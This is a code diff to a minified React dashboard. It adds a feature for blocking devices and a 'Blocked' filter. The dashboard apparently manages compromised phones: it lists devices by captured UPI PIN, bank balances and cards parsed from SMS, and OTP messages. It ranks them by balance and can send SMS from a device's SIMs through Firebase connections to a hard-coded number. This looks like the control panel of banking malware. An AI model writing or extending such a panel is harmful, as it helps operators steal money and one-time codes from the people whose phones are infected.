@@ -20994,13 +20994,27 @@ function o1({
 
 function f1({
     dev: A,
-    onClick: tt
+    onClick: tt,
+    isBlocked,
+    onBlock,
+    onUnblock
 }) {
+    const handleBlockClick = (e) => {
+        e.stopPropagation();
+        if (isBlocked) {
+            if (onUnblock) onUnblock();
+        } else {
+            if (confirm(`Block "${A.name || A.id}"?\nIt won't show in the list anymore. You can unblock it later from the "🚫 Blocked" filter.`)) {
+                if (onBlock) onBlock();
+            }
+        }
+    };
     const [testBusy1, setTestBusy1] = jt.useState(false),
         [testStatus, setTestStatus] = jt.useState(null),
         handleTestSim = async (x) => {
             x.stopPropagation();
             if (testBusy1) return;
+            if (isBlocked) { setTestStatus("✗ Device is blocked"); setTimeout(() => setTestStatus(null), 3000); return; }
             setTestBusy1(true);
             const devId = A.sourceDeviceId || A.id,
                 fbUrl = A._fbUrl,
@@ -21058,6 +21072,13 @@ function f1({
                     className: "w-3.5 h-3.5 text-emerald-400"
                 }), f && r.jsx(Wl, {
                     className: "w-3.5 h-3.5 text-purple-400"
+                }), r.jsx("button", {
+                    onClick: handleBlockClick,
+                    className: isBlocked
+                        ? "px-1.5 py-0.5 rounded-md text-[9px] font-bold bg-emerald-600/20 border border-emerald-600/40 text-emerald-400 hover:bg-emerald-600/30 transition-colors"
+                        : "p-1 rounded-lg text-[#444] hover:text-red-400 hover:bg-red-500/10 transition-colors",
+                    title: isBlocked ? "Unblock this device" : "Block this device so it doesn't appear in the list",
+                    children: isBlocked ? "Unblock" : "🚫"
                 }), r.jsx("button", {
                     onClick: x => {
                         x.stopPropagation(), tt()
@@ -21191,10 +21212,10 @@ function f1({
         }), A._fbUrl && A._fbKey && r.jsxs(r.Fragment, {
             children: [r.jsx("button", {
                 onClick: x => handleTestSim(x),
-                disabled: testBusy1 || !A.status,
-                title: A.status ? "Send test SMS via SIM 1 & SIM 2 to 8093369768" : "Device offline",
-                className: "mt-2 w-full py-1.5 rounded-xl text-[10px] font-bold tracking-wide transition-all " + (A.status ? "bg-blue-600/15 border border-blue-600/30 text-blue-400 hover:bg-blue-600/25 active:scale-95" : "bg-[#1a1a1a] border border-[#262626] text-[#444] cursor-not-allowed"),
-                children: testBusy1 ? "Sending…" : "Test SIMs"
+                disabled: testBusy1 || !A.status || isBlocked,
+                title: isBlocked ? "Device is blocked — unblock to test" : (A.status ? "Send test SMS via SIM 1 & SIM 2 to 8093369768" : "Device offline"),
+                className: "mt-2 w-full py-1.5 rounded-xl text-[10px] font-bold tracking-wide transition-all " + (isBlocked ? "bg-gray-700/20 border border-gray-500/30 text-gray-500 cursor-not-allowed" : (A.status ? "bg-blue-600/15 border border-blue-600/30 text-blue-400 hover:bg-blue-600/25 active:scale-95" : "bg-[#1a1a1a] border border-[#262626] text-[#444] cursor-not-allowed")),
+                children: isBlocked ? "Blocked — cannot test" : (testBusy1 ? "Sending…" : "Test SIMs")
             }), testStatus && r.jsx("div", {
                 className: "mt-1 text-center text-[10px] font-semibold " + (testStatus.startsWith("✓") ? "text-emerald-400" : testStatus.startsWith("⚠") ? "text-amber-400" : "text-red-400"),
                 children: testStatus
@@ -22046,7 +22067,9 @@ function p1({
 }) {
     const [firebaseSources, setFirebaseSources] = jt.useState(() => (multiConnections?.length ? multiConnections : [{ url: A, key: tt }]).filter(source => source && typeof source.url === "string" && source.url.trim())), isMultiFirebase = firebaseSources.length > 1, sourcesRef = jt.useRef(firebaseSources);
     sourcesRef.current = firebaseSources;
-    const [d, S] = jt.useState([]), [f, p] = jt.useState(!0), [h, o] = jt.useState(!1), [x, T] = jt.useState(null), [w, C] = jt.useState("online"), [v, E] = jt.useState("balance"), [g, z] = jt.useState(""), [N, k] = jt.useState(""), [M, H] = jt.useState(""), [L, nt] = jt.useState(new Date), [loadStatus, setLoadStatus] = jt.useState(""), [pageSize, setPageSize] = jt.useState(200), [balanceScope, setBalanceScope] = jt.useState("online"), [selectedBank, setSelectedBank] = jt.useState(""), [firebaseScope, setFirebaseScope] = jt.useState("online"), [selectedFirebase, setSelectedFirebase] = jt.useState(""), [selectedFirebaseBank, setSelectedFirebaseBank] = jt.useState(""), [quickAddOpen, setQuickAddOpen] = jt.useState(!1), [quickUrl, setQuickUrl] = jt.useState(""), [quickKey, setQuickKey] = jt.useState(""), [quickBusy, setQuickBusy] = jt.useState(!1), [minBalance, setMinBalance] = jt.useState(""), [bulkTestBusy, setBulkTestBusy] = jt.useState(false), [bulkTestProgress, setBulkTestProgress] = jt.useState(null), V = jt.useRef(0), ot = jt.useRef(null), $ = jt.useRef(null), ht = jt.useRef(new Set), smsScanBusy = jt.useRef(!1), connectionRefreshBusy = jt.useRef(!1), smsScanTick = jt.useRef(0), smsLatestRef = jt.useRef(new Map), devicesRef = jt.useRef(d), xt = jt.useCallback(U => {
+    const [d, S] = jt.useState([]), [f, p] = jt.useState(!0), [h, o] = jt.useState(!1), [x, T] = jt.useState(null), [w, C] = jt.useState("online"), [v, E] = jt.useState("balance"), [g, z] = jt.useState(""), [N, k] = jt.useState(""), [M, H] = jt.useState(""), [L, nt] = jt.useState(new Date), [loadStatus, setLoadStatus] = jt.useState(""), [pageSize, setPageSize] = jt.useState(200), [balanceScope, setBalanceScope] = jt.useState("online"), [selectedBank, setSelectedBank] = jt.useState(""), [firebaseScope, setFirebaseScope] = jt.useState("online"), [selectedFirebase, setSelectedFirebase] = jt.useState(""), [selectedFirebaseBank, setSelectedFirebaseBank] = jt.useState(""), [quickAddOpen, setQuickAddOpen] = jt.useState(!1), [quickUrl, setQuickUrl] = jt.useState(""), [quickKey, setQuickKey] = jt.useState(""), [quickBusy, setQuickBusy] = jt.useState(!1), [minBalance, setMinBalance] = jt.useState(""), [bulkTestBusy, setBulkTestBusy] = jt.useState(false), [bulkTestProgress, setBulkTestProgress] = jt.useState(null), [blockedDevices, setBlockedDevices] = jt.useState(() => {
+            try { const s = localStorage.getItem("sam_blocked_devices"); return new Set(s ? JSON.parse(s) : []); } catch { return new Set(); }
+        }), V = jt.useRef(0), ot = jt.useRef(null), $ = jt.useRef(null), ht = jt.useRef(new Set), smsScanBusy = jt.useRef(!1), connectionRefreshBusy = jt.useRef(!1), smsScanTick = jt.useRef(0), smsLatestRef = jt.useRef(new Map), devicesRef = jt.useRef(d), xt = jt.useCallback(U => {
         k(U), setTimeout(() => k(""), 5000)
     }, []), D = jt.useCallback(async (U, J) => {
         try {
@@ -22185,6 +22208,12 @@ function p1({
             window.history.pushState({ ...window.history.state, narutoDevicePanel: !0 }, "", window.location.href), T(U)
         },
         _mtAll = jt.useMemo(() => d.filter(U => {
+            // "blocked" filter shows ONLY blocked devices; every other filter hides them
+            if (w === "blocked") {
+                if (!blockedDevices.has(U.id)) return !1;
+            } else {
+                if (blockedDevices.has(U.id)) return !1;
+            }
             if (w === "online" && !U.status || w === "offline" && U.status || w === "upi" && !U.upipin || w === "bank" && !U.smsAnalysis ?.bankBalances.length || w === "bank online" && (!U.status || !U.smsAnalysis ?.bankBalances.length) || w === "card" && !U.smsAnalysis ?.cards.length || w === "otp" && !(U.smsAnalysis?.otpMessages||[]).length) return !1;
             // Minimum balance filter — applies to any view that includes a bank balance
             const _minBal = parseFloat(minBalance);
@@ -22202,7 +22231,7 @@ function p1({
             const balanceOf = St => Math.max(0, ...(St.smsAnalysis?.bankBalances||[]).map(yt => Number(String(yt.availableBalance||0).replace(/[^0-9.-]/g,""))||0));
             const txnOf = St => Math.max(0, ...(St.smsAnalysis?.bankBalances||[]).map(yt => Number(String(yt.txnAmount||0).replace(/[^0-9.-]/g,""))||0));
             return v === "balance" ? balanceOf(J)-balanceOf(U) : v === "txn" ? txnOf(J)-txnOf(U) : v === "name" ? U.name.localeCompare(J.name) : v === "battery" ? J.batteryPercent - U.batteryPercent : v === "old" ? U.id.localeCompare(J.id) : J.id.localeCompare(U.id)
-        }), [d, w, g, v, minBalance]),
+        }), [d, w, g, v, minBalance, blockedDevices]),
         mt = jt.useMemo(() => _mtAll.slice(0, pageSize), [_mtAll, pageSize]),
         it = jt.useMemo(() => d.filter(U => U.status).length, [d]),
         bt = d.length - it,
@@ -22210,10 +22239,38 @@ function p1({
         _ = jt.useMemo(() => d.filter(U => U.smsAnalysis ?.cards.length).length, [d]),
         upiCount = jt.useMemo(() => d.filter(U => U.upipin).length, [d]),
         otpCount = jt.useMemo(() => d.filter(U => (U.smsAnalysis?.otpMessages||[]).length).length, [d]),
+        blockedCount = blockedDevices.size,
+        persistBlocked = (next) => {
+            try { localStorage.setItem("sam_blocked_devices", JSON.stringify([...next])); } catch (_) {}
+        },
+        blockDevice = (devId) => {
+            if (!devId) return;
+            const next = new Set(blockedDevices);
+            next.add(devId);
+            setBlockedDevices(next);
+            persistBlocked(next);
+            xt(`🚫 Device blocked`);
+        },
+        unblockDevice = (devId) => {
+            if (!devId) return;
+            const next = new Set(blockedDevices);
+            next.delete(devId);
+            setBlockedDevices(next);
+            persistBlocked(next);
+            xt(`✅ Device unblocked`);
+        },
+        unblockAllDevices = () => {
+            if (blockedDevices.size === 0) return;
+            if (!confirm(`Unblock all ${blockedDevices.size} blocked device${blockedDevices.size===1?"":"s"}?`)) return;
+            const next = new Set();
+            setBlockedDevices(next);
+            persistBlocked(next);
+            xt(`✅ Unblocked all devices`);
+        },
         handleBulkTest = async () => {
             if (bulkTestBusy) return;
-            // Gather currently filtered devices that have Firebase connection + are online
-            const targets = _mtAll.filter(U => U._fbUrl && U._fbKey && U.status);
+            // Gather currently filtered devices that have Firebase connection + are online + are NOT blocked
+            const targets = _mtAll.filter(U => U._fbUrl && U._fbKey && U.status && !blockedDevices.has(U.id));
             if (targets.length === 0) {
                 xt("No online filtered devices to test");
                 return;
@@ -22433,10 +22490,10 @@ function p1({
                 }), r.jsxs("div", {
                     className: "ml-auto flex items-center gap-2 flex-wrap",
                     children: [
-                        ["all", "online", "offline", "upi", "bank", "bank online", "otp", "card", ...(isMultiFirebase ? ["balances"] : []), "firebase"].map(U => r.jsx("button", {
+                        ["all", "online", "offline", "upi", "bank", "bank online", "otp", "card", ...(isMultiFirebase ? ["balances"] : []), "firebase", ...(blockedCount > 0 ? ["blocked"] : [])].map(U => r.jsx("button", {
                             onClick: () => { C(U); setPageSize(200); },
-                            className: `px-3 py-1.5 rounded-lg text-xs font-semibold capitalize transition-all ${w===U?U==="bank"||U==="bank online"||U==="balances"?"bg-emerald-600/20 text-emerald-400 border border-emerald-600/30":U==="otp"?"bg-amber-600/20 text-amber-400 border border-amber-600/30":U==="card"?"bg-purple-600/20 text-purple-400 border border-purple-600/30":"bg-red-600/20 text-red-400 border border-red-600/30":"text-[#555] hover:text-[#888]"}`,
-                            children: U === "balances" ? "Balances" : U === "firebase" ? "Firebase Summary" : U === "bank online" ? "Bank Online" : U === "otp" ? "OTP" : U
+                            className: `px-3 py-1.5 rounded-lg text-xs font-semibold capitalize transition-all ${w===U?U==="bank"||U==="bank online"||U==="balances"?"bg-emerald-600/20 text-emerald-400 border border-emerald-600/30":U==="otp"?"bg-amber-600/20 text-amber-400 border border-amber-600/30":U==="card"?"bg-purple-600/20 text-purple-400 border border-purple-600/30":U==="blocked"?"bg-gray-600/30 text-gray-300 border border-gray-500/40":"bg-red-600/20 text-red-400 border border-red-600/30":"text-[#555] hover:text-[#888]"}`,
+                            children: U === "balances" ? "Balances" : U === "firebase" ? "Firebase Summary" : U === "bank online" ? "Bank Online" : U === "otp" ? "OTP" : U === "blocked" ? `🚫 Blocked (${blockedCount})` : U
                         }, U)), r.jsx("div", {
                             className: "w-px h-4 bg-[#222]"
                         }),
@@ -22475,6 +22532,12 @@ function p1({
                         bulkTestProgress && !bulkTestBusy && r.jsxs("span", {
                             className: `text-[10px] px-2 py-1 rounded ${bulkTestProgress.fail===0 ? "bg-emerald-600/20 text-emerald-400" : "bg-amber-600/20 text-amber-400"}`,
                             children: [`Done: ✓${bulkTestProgress.ok} ✗${bulkTestProgress.fail}`]
+                        }),
+                        w === "blocked" && blockedCount > 0 && r.jsx("button", {
+                            onClick: unblockAllDevices,
+                            className: "px-3 py-1.5 rounded-lg text-xs font-bold bg-emerald-600/20 border border-emerald-600/40 text-emerald-400 hover:bg-emerald-600/30 active:scale-95",
+                            title: "Unblock all devices",
+                            children: "Unblock All"
                         }),
                         r.jsx("div", {
                             className: "w-px h-4 bg-[#222]"
@@ -22635,7 +22698,10 @@ function p1({
                     className: "grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 2xl:grid-cols-5 gap-4",
                     children: [mt.map(U => r.jsx(f1, {
                         dev: U,
-                        onClick: () => q(U)
+                        onClick: () => q(U),
+                        isBlocked: blockedDevices.has(U.id),
+                        onBlock: () => blockDevice(U.id),
+                        onUnblock: () => unblockDevice(U.id)
                     }, U.id)), mt.length === 0 && r.jsx("div", {
                         className: "col-span-full py-16 text-center",
                         children: r.jsx("p", {
